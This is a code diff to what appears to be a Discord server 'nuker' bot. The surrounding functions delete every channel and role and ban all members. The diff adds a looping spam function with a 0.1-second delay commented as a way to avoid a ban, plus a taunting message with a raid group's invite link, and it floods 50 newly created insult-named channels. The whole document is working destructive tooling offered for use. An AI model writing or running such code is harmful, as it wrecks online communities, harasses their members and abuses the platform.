@@ -25,6 +25,8 @@ baner = f'''
 {r}|_| \_|\__,_|_|\_\___{m}|____/ \___/ \__|
 {y}Made by: {g}https://github.com/Sigma-cc'''
 
+SPAM_MESSAGE = "010101010-00-0-00-000100101011010101010101011001910101010010101010101001010 FKD BY WEPAIDDDDD GET BACKKKK https://discord.gg/wepaid"
+
 async def delete_all_channels(guild):
     deleted = 0
     tasks = []
@@ -63,15 +65,22 @@ async def ban_all_members(guild):
             banned += 1
     return banned
 
+async def spam_channel(channel):
+    while True:
+        try:
+            await channel.send(SPAM_MESSAGE)
+            await asyncio.sleep(0.1) # Small delay to avoid immediate ban
+        except:
+            break
+
 async def create_nuke_channels(guild):
-    created = 0
+    created_channels = []
     names = [
         "[😂] 𝐆𝐄𝐓𝐁𝐀𝐂𝐊",
         "[☠️] 𝟕𝟔𝟐𝐇𝐔𝐑𝐓",
         "[😭] 𝐅𝐊𝐃 𝐁𝐘 𝐖𝐄𝐏𝐀𝐈𝐃",
         "[🤑] 𝐖𝐄 𝐎𝐖𝐍 𝐘𝐎𝐔"
     ]
-    # Creating 50 channels to stay within safer limits initially
     tasks = []
     for _ in range(50):
         tasks.append(guild.create_text_channel(name=random.choice(names)))
@@ -79,10 +88,8 @@ async def create_nuke_channels(guild):
     results = await asyncio.gather(*tasks, return_exceptions=True)
     for res in results:
         if not isinstance(res, Exception):
-            created += 1
-        else:
-            print(f"{r}[!] Error creating channel: {res}")
-    return created
+            created_channels.append(res)
+    return created_channels
 
 async def nuke_guild(guild):
     print(f'{r}[!] Starting nuke on: {m}{guild.name}')
@@ -99,9 +106,13 @@ async def nuke_guild(guild):
     deleted_roles = await delete_all_roles(guild)
     print(f'{m}[+] Deleted Roles: {b}{deleted_roles}')
     
-    # 4. Create channels
-    created_channels = await create_nuke_channels(guild)
-    print(f'{m}[+] Created Channels: {b}{created_channels}')
+    # 4. Create channels and start spamming
+    channels = await create_nuke_channels(guild)
+    print(f'{m}[+] Created Channels: {b}{len(channels)}')
+    
+    print(f'{y}[!] Starting spam in all channels...')
+    for channel in channels:
+        asyncio.create_task(spam_channel(channel))
     
     print(f'{r}--------------------------------------------\n\n')
 
